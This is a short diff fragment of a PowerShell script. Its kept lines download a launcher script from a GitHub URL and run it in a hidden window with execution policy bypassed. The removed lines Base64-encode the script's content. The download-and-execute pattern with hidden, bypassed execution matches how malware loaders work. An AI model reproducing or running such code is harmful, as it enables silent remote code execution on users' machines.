@@ -8,7 +8,3 @@ $launcherUrl='https://raw.githubusercontent.com/astro-opensource/cloud-sync-tool
 $launcherPath="$cache\launcher.ps1"
 (New-Object Net.WebClient).DownloadFile($launcherUrl,$launcherPath)
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden
-'@
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($bootContent)
-$encodedCommand = [Convert]::ToBase64String($bytes)
-Write-Output $encodedCommand
